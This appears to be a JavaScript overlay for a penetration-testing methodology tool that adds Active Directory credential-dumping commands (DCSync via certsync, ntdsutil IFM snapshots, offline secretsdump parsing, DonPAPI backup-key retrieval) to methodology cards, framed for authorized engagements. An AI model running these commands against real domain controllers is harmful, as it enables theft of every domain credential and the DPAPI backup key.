// Obol v8.5 methodology overlay — finish dom_admin.md whole-file source integration.
(function(root){
'use strict';
const lanes=root.OBOL_LANES||[],O=root.OBOL_ORANGE_AD_2025_03,F=root.OBOL_ORANGE_FIDELITY_V64,F85=root.OBOL_ORANGE_FIDELITY_V85,M84=root.OBOL_METHODOLOGY_V84;
if(!O||!F||!F85||!M84)throw new Error('Obol Orange, source fidelity, and v8.4 methodology are required before methodology-v8.5.js');
function card(id){for(const l of lanes)for(const c of l.cards||[])if(c.id===id)return c;return null;}
function section(key){for(const f of O.files||[])for(const s of f.sections||[])if(s.key===key)return s;return null;}
function addCommand(c,cmd){if(!c)throw new Error('Missing v8.5 command owner');c.commands=c.commands||[];let hit=c.commands.find(x=>String(x.run||'')===String(cmd.run||''));if(!hit){c.commands.push(cmd);hit=cmd;}hit.operatorSurface85Source=hit.operatorSurface85Source||'audited-v8.5';return hit;}
function markExisting(c,re){if(!c)return;for(const cmd of c.commands||[])if(re.test(String(cmd.run||'')))cmd.operatorSurface85Source=cmd.operatorSurface85Source||'audited-v8.5';}
const surf=s=>({operatorSurface40:s,operatorSurface85Source:'audited-v8.5'}),stage={stage:'domain',order:70,label:'Collect domain credential material',summary:'Keep replication, offline database collection, backup-key retrieval, returned credential artifacts, later authentication, execution, privilege, and cleanup as separate proof states.',canonicalKeys:[]};
function provenance(c,key){const s=section(key);if(!c)throw new Error('Missing v8.5 owner for '+key);c.orange43=c.orange43||[];if(!c.orange43.some(x=>x.key===key))c.orange43.push({key,file:'dom_admin.md',label:(s&&s.label)||key,status:(s&&s.status)||'implemented',advancedIn:(s&&s.advancedIn)||''});c.orange44=c.orange44||{...stage,canonicalKeys:[]};c.orange44.canonicalKeys=c.orange44.canonicalKeys||[];if(!c.orange44.canonicalKeys.includes(key))c.orange44.canonicalKeys.push(key);}
const dcsync=card('dcsync'),dump=card('dump-secrets'),backup=card('domain-backup-key55');
for(const c of [dcsync,dump,backup])if(!c)throw new Error('v8.5 missing mature domain-admin owner');
markExisting(dcsync,/nxc smb .* --ntds/);markExisting(dcsync,/impacket-secretsdump/);markExisting(dcsync,/lsadump::dcsync/);
addCommand(dcsync,{tool:'certsync',run:"certsync -u {{user}} -p '{{password}}' -d {{domain}} -dc-ip {{target}} -ns {{dns_server}}",note:'Pinned certificate-assisted synchronization route. Treat returned hashes as credential material only; later authentication, service access, execution, and privilege require separate Evidence.',...surf('kali')});
addCommand(dump,{tool:'ntdsutil',run:'ntdsutil "activate instance ntds" "ifm" "create full C:\\temp\\ntds-ifm" quit quit',note:'Corrected and expanded pinned IFM snapshot route. Use only from a separately proven privileged DC context, preserve the resulting NTDS/SYSTEM artifacts, then remove the temporary target-side IFM directory after authorized collection.',...surf('windows')});
addCommand(dump,{tool:'impacket-secretsdump',run:'impacket-secretsdump -ntds {{file}} -system {{system_file}} LOCAL -outputfile {{output}}',note:'Offline parse of a separately collected NTDS.dit and matching SYSTEM hive. Explicit returned hashes are credential material; parsing does not establish later authenticated access.',...surf('kali')});
addCommand(backup,{tool:'donpapi',run:"donpapi collect -H ':{{hash}}' '{{domain}}/{{user}}@{{target}}' -t ALL --fetch-pvk",note:'Corrected pinned DonPAPI backup-key route. Preserve the exported PVK/backup-key artifact separately; retrieval does not prove any user secret was decrypted or that later access succeeded.',...surf('kali')});
dump.sourceCorrection85={sourceFile:'dom_admin.md',sourceSha:F85.sourceSha,corrections:['Expand the abbreviated NTDSUtil activate-instance/IFM spelling into an explicit command sequence.','Remove the pinned offline secretsdump -hashes lmhash:nthash argument because the matching SYSTEM hive supplies the boot-key material required for NTDS decryption.']};
backup.sourceCorrection85={sourceFile:'dom_admin.md',sourceSha:F85.sourceSha,corrections:['Normalize the pinned DonPAPI spaced - H token to -H.','Keep backup-key retrieval separate from later DPAPI decryption and credential validation.']};
dcsync.sourceInventory85={file:'dom_admin.md',sourceSha:F85.sourceSha,note:'v8.5 accounts for NetExec, Impacket, Mimikatz, and CertSync domain credential-replication variants through the mature DCSync owner while keeping returned credential material below later access and privilege.'};
dump.sourceInventory85={file:'dom_admin.md',sourceSha:F85.sourceSha,note:'v8.5 completes the NTDSUtil IFM and offline NTDS parsing variants with sensitive-artifact handling and cleanup.'};
backup.sourceInventory85={file:'dom_admin.md',sourceSha:F85.sourceSha,note:'v8.5 completes the pinned DonPAPI domain backup-key route with corrected option spelling and conservative recovery-material proof.'};
const touched=new Set();for(const uid of F85.fileAuditedIds||[]){const u=(F.units||[]).find(x=>x.id===uid);if(!u)throw new Error('Missing v8.5 domain-admin fidelity unit '+uid);for(const owner of u.ownerCardIds||[]){const c=card(owner);if(!c)throw new Error('Missing v8.5 owner '+owner+' for '+uid);provenance(c,u.canonicalKey);c.atomic85=[...new Set([...(c.atomic85||[]),uid])];touched.add(owner);}}
for(const key of ['dom_admin.ntds','dom_admin.backup-keys']){const s=section(key);if(!s||s.status!=='implemented')throw new Error('v8.5 expected implemented domain-admin canonical parent '+key);}
O.coverageRevision='8.5';O.coverageOverlay='data/methodology-v8.5.js';
root.OBOL_METHODOLOGY_V85={version:'8.5.0',sourceFile:'dom_admin.md',sourceSha:F85.sourceSha,cardIds:[...touched],fidelityIds:F85.fileAuditedIds.slice(),newFidelityIds:F85.newAuditedIds.slice(),canonicalAdvanced:[],fileAtomized:true,sourceCorrectionIds:['dom-admin.ntds-ifm-create','dom-admin.ntds-ifm-offline','dom-admin.backup-donpapi'],statement:'v8.5 completes dom_admin.md whole-file source inventory through mature DCSync, credential-dump, and domain DPAPI backup-key owners. It accounts for every pinned terminal variant, explicitly supersedes the redundant Metasploit route, corrects incomplete source spellings, and preserves credential material, later authentication, execution, privilege, cleanup, Next Steps, and reporting as separate boundaries.'};
})(typeof window!=='undefined'?window:globalThis);
